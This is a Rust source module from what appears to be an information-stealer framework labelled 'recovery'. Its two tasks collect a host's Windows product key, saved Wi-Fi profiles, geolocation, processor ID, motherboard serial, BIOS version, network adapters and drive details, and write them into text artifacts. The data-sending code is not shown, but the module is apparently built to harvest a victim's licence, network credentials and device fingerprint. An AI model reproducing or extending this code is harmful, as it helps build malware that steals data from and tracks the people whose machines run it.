use crate::recovery::helpers::winhttp::Client;
use crate::recovery::{
    context::RecoveryContext,
    helpers::hardware as hardware_helpers,
    output::write_text_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::fmt::Write;
use std::sync::Arc;

pub fn hardware_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(HardwareSnapshotTask),
        Arc::new(HardwareDriveTask),
    ]
}

struct HardwareSnapshotTask;

#[async_trait]
impl RecoveryTask for HardwareSnapshotTask {
    fn label(&self) -> String {
        "Hardware Snapshot".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = gather_hardware_snapshot().await;
        let artifact = write_text_artifact(
            ctx,
            self.category(),
            &self.label(),
            "hardware-info.txt",
            &summary,
        )
        .await?;

        Ok(artifact.into_iter().collect())
    }
}

struct HardwareDriveTask;

#[async_trait]
impl RecoveryTask for HardwareDriveTask {
    fn label(&self) -> String {
        "Storage Details".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = gather_drive_info().await;
        let artifact = write_text_artifact(
            ctx,
            self.category(),
            &self.label(),
            "harddrives.txt",
            &summary,
        )
        .await?;

        Ok(artifact.into_iter().collect())
    }
}

async fn gather_hardware_snapshot() -> String {
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap_or_else(|_| Client::new());

    let snapshot = hardware_helpers::gather_snapshot(&client).await;

    let mut builder = String::new();
    writeln!(builder, "Operating System:\n{}", snapshot.operating_system).ok();
    writeln!(builder, "\nLocation:\n{}", snapshot.location).ok();
    writeln!(builder, "\nWindows Product Key:\n{}", snapshot.product_key).ok();
    writeln!(builder, "\nBIOS Version:\n{}", snapshot.bios_version).ok();
    writeln!(builder, "\nProcessor ID:\n{}", snapshot.processor_id).ok();
    writeln!(
        builder,
        "\nMotherboard Serial:\n{}",
        snapshot.motherboard_serial
    )
    .ok();
    writeln!(
        builder,
        "\nTotal Physical Memory:\n{}",
        snapshot.total_physical_memory
    )
    .ok();
    writeln!(builder, "\nGraphics:\n{}", snapshot.graphics_card).ok();
    writeln!(
        builder,
        "\nSaved WIFI Profiles:\n{}",
        snapshot.wifi_profiles
    )
    .ok();
    writeln!(builder, "\nSystem Uptime:\n{}", snapshot.system_uptime).ok();
    writeln!(
        builder,
        "\nNetwork Adapters:\n{}",
        snapshot.network_adapters
    )
    .ok();

    builder
}

async fn gather_drive_info() -> String {
    let drive_details = hardware_helpers::gather_drive_info().await;
    let mut builder = String::new();
    writeln!(builder, "Disk Drives:\n{}", drive_details.disk_drives).ok();
    writeln!(builder, "\nPartitions:\n{}", drive_details.partitions).ok();
    writeln!(builder, "\nLogical Disks:\n{}", drive_details.logical_disks).ok();
    builder
}
